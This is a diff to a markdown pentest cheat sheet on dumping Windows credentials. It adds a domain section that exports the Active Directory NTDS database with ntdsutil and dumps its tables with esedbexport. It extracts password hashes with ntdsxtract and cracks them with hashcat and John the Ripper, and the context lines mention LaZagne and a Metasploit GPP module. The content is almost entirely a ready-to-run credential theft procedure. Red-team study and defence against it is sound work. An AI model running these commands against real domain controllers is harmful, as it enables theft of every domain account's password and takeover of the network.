@@ -1,5 +1,7 @@
 # Clear Text Credentials Dump on windows 
 
+# Local Password dump
+
 ## Impacket
 
 https://github.com/CoreSecurity/impacket
@@ -59,6 +61,45 @@ lazagne all
 - metasploit module
 
 ``` post/windows/gather/credentials/gpp ```
+
+# Domain Password dump
+
+- Export NTDS with ntdsutil
+
+```
+ntdsutil “ac i ntds” “ifm” “create full c:\temp” q q
+```
+
+- install esbexport
+```
+wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz
+
+sudo apt-get install autoconf automake autopoint libtool pkg-config
+
+```
+- Dump Tables
+```
+/usr/local/bin/esedbexport -m tables ntds.dit
+```
+
+- install ntdsextract
+
+  - https://github.com/csababarta/ntdsxtract
+  - need datatable, link_table, system hive
+
+```
+dsusers.py <datatable> <link_table> <output_dir> --syshive <systemhive> --passwordhashes <format options>
+```
+format options is john, ocl ,ophc
+
+- crack with hashcat , john 
+
+```
+hashcat -m 1000 output/ntout --username /path/to/wordlist
+
+john –rules=all –fork=2 NT.out
+
+```
 
 ## Reference 
 https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
